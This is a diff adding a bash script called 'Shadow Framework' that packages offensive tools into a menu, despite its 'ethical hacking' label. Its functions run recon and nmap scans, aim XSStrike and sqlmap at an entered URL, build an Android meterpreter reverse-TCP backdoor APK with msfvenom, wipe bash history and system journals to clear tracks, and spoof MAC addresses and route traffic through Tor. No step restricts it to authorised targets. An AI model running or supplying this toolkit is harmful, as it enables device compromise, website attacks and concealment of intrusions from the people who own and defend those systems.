@@ -1,0 +1,155 @@
+
+#!/bin/bash
+
+# Shadow Framework: AI-Powered Ethical Hacking Suite by Devansh
+
+BASE_DIR="$HOME/shadow_framework"
+TOOLS_DIR="$BASE_DIR/tools"
+LOG_DIR="$BASE_DIR/logs"
+VERBOSE=true
+mkdir -p "$TOOLS_DIR"
+mkdir -p "$LOG_DIR"
+timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
+LOG_FILE="$LOG_DIR/shadow_$timestamp.log"
+
+function log() {
+    echo -e "$1" | tee -a "$LOG_FILE"
+}
+
+function verbose() {
+    if [ "$VERBOSE" = true ]; then
+        echo -e "\e[36m[+]\e[0m $1"
+    fi
+}
+
+function banner() {
+    clear
+    echo -e "\e[35m"
+    echo "███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗"
+    echo "██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║"
+    echo "█████╗  ███████║███████║██████╔╝██║   ██║██║ █╗ ██║"
+    echo "██╔══╝  ██╔══██║██╔══██║██╔═══╝ ██║   ██║██║███╗██║"
+    echo "███████╗██║  ██║██║  ██║██║     ╚██████╔╝╚███╔███╔╝"
+    echo "╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝  ╚══╝╚══╝ "
+    echo -e "\e[33m           SHADOW Framework - Real Tool ⚔️\e[0m"
+    echo ""
+}
+
+function recon() {
+    read -p "🌐 Enter target domain: " domain
+    log "\n[RECON] Target: $domain"
+
+    verbose "Running WHOIS..."
+    whois $domain | tee -a "$LOG_FILE"
+
+    verbose "Running NSLOOKUP..."
+    nslookup $domain | tee -a "$LOG_FILE"
+
+    verbose "Running theHarvester..."
+    theHarvester -d $domain -b all | tee -a "$LOG_FILE"
+
+    verbose "Running Sublist3r..."
+    python3 "$TOOLS_DIR/Sublist3r/sublist3r.py" -d $domain | tee -a "$LOG_FILE"
+
+    verbose "Running Amass..."
+    amass enum -d $domain | tee -a "$LOG_FILE"
+}
+
+function scan() {
+    read -p "🌐 Enter IP or domain to scan: " target
+    log "\n[SCAN] Target: $target"
+
+    verbose "Running Nmap..."
+    nmap -A $target | tee -a "$LOG_FILE"
+
+    verbose "Running WhatWeb..."
+    whatweb $target | tee -a "$LOG_FILE"
+}
+
+function exploit() {
+    read -p "🎯 Enter URL to attack: " url
+    log "\n[EXPLOIT] Target: $url"
+
+    verbose "Running XSStrike..."
+    python3 "$TOOLS_DIR/XSStrike/xsstrike.py" -u $url | tee -a "$LOG_FILE"
+
+    verbose "Running SQLmap..."
+    sqlmap -u $url --batch --random-agent | tee -a "$LOG_FILE"
+}
+
+function backdoor() {
+    verbose "Creating backdoor with msfvenom..."
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR-IP LPORT=4444 -o "$BASE_DIR/payload.apk"
+    log "⚠️ Replace 'YOUR-IP' with your real IP in msfconsole"
+}
+
+function clear_tracks() {
+    verbose "Clearing bash history and logs..."
+    history -c
+    sudo journalctl --rotate
+    sudo journalctl --vacuum-time=1s
+    log "🧹 Logs wiped (as much as Linux lets us)"
+}
+
+function cloak_mode() {
+    echo -e "\n🌐 Cloaking Options:"
+    echo "1) Change MAC Address"
+    echo "2) Use Tor for Anonymity"
+    echo "3) Back to Menu"
+    read -p "Choose (1-3): " cloak_opt
+
+    case $cloak_opt in
+        1)
+            read -p "Enter interface (like eth0, wlan0): " iface
+            sudo ifconfig $iface down
+            sudo macchanger -r $iface
+            sudo ifconfig $iface up
+            verbose "🔁 MAC address randomized on $iface"
+            ;;
+        2)
+            sudo systemctl start tor
+            verbose "🌍 Tor started. Routing commands through torsocks."
+            torsocks curl https://check.torproject.org | grep -q "Congratulations"
+            if [ $? -eq 0 ]; then
+                log "✅ Successfully connected to Tor"
+            else
+                log "❌ Tor connection failed"
+            fi
+            ;;
+        3)
+            return
+            ;;
+        *)
+            echo "Invalid option"
+            ;;
+    esac
+}
+
+function menu() {
+    banner
+    echo -e "\n🛠️ What do you wanna do?\n"
+    echo "1) Recon"
+    echo "2) Scan"
+    echo "3) Exploit"
+    echo "4) Deploy Backdoor"
+    echo "5) Clear Tracks"
+    echo "6) Cloak (MAC & IP Switcher)"
+    echo "7) Exit"
+    read -p "Pick an option (1-7): " choice
+
+    case $choice in
+        1) recon ;;
+        2) scan ;;
+        3) exploit ;;
+        4) backdoor ;;
+        5) clear_tracks ;;
+        6) cloak_mode ;;
+        7) echo "Bye Shadow Soldier 🫡"; exit ;;
+        *) echo "Bruh, that's not even an option 🤡" ;;
+    esac
+}
+
+while true; do
+    menu
+    read -p "⏭ Press Enter to return to menu..."
+done
